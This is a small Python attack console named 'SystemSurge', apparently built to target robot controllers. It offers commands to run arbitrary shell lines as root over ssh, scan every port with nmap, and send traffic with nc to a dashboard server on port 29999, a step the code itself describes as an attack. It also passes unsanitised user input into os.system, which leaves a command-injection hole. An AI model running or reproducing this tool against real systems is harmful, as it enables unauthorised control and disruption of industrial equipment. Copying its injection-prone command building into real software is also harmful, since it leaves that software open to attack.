#!/usr/bin/env python3
import os
import pyfiglet
import cmd
import subprocess

class CLI(cmd.Cmd):

    prompt = '>> '
    intro = "Welcome to SystemSurge"
    target_ip = "0.0.0.0"
    target_user = "root"

    def do_version(self, line):
        """version checker"""
        command = "ssh -t "+self.target_user + "@"+self.target_ip+" " + line
        result = subprocess.getoutput(command)
        print(result)

    def do_dos(self, line):
        """Attacks the dashboard server"""
        os.system("printf \"get robot model\"|nc "+self.target_ip+" 29999")

    def do_ip(self, line):
        """sets the ip for target"""
        self.target_ip = line.strip()

    def do_user(self, line):
        """sets the user for target"""
        self.target_user = line.strip()

    def do_vul_analysis(self, line):
        """runs a simple vulnerability analysis"""
        os.system("nmap "+self.target_ip + " -p-")

    def do_quit(self, line):
        """Exit the CLI."""
        return True


if __name__ == '__main__':
    try:
        ascii_banner = pyfiglet.figlet_format("SystemSurge")
        print(ascii_banner)
    except:
        pass

    CLI().cmdloop()
